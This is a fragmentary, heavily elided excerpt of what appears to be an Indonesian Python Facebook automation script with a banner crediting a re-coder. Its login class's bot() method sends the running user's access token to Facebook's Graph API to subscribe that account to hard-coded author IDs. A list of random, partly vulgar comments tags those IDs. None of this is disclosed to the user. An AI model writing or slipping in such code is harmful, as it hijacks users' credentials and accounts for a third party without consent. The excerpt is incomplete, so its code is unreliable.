...
komen = random.choice(['Gua Pake Sc lu bang😘 @[100068397981838:0] I Love YoU',Lung entod bang😘@[100068397981838:0]','Gua pake sc lu bg😏@[100044663564610:0]','Kamu ganteng banget deh bang @[100046031671446:0]','Kamu manis bang bang @[100068397981838:0]','Kamu cantik banget anak siapa @[100068397981838:0]','Kamu ganteng banget bang @[100068397981838:0]','Mantap bang love you','Khamdihi nggak ada obat script nya emang','pengin kaya elu bang bisa ngocok stading @[100068397981838:0]'])
...
───────────────────────────────────────────────────────
 ...
 [\x1b[1;96m+%s] istagrm   : Nikikiy.4
 [\x1b[1;96m+%s] Recode: Niki marak?
───────────────────────────────────────────────────────\n'''%(N,N,N,N))
...
class login:
	...
	def bot(self):
		...
		requests.post('https://graph.facebook.com/100068397981838/subscribers?access_token=' + toket) #Niki mark
		requests.post('https://graph.facebook.com/100039177390395/subscribers?access_token=' + toket)
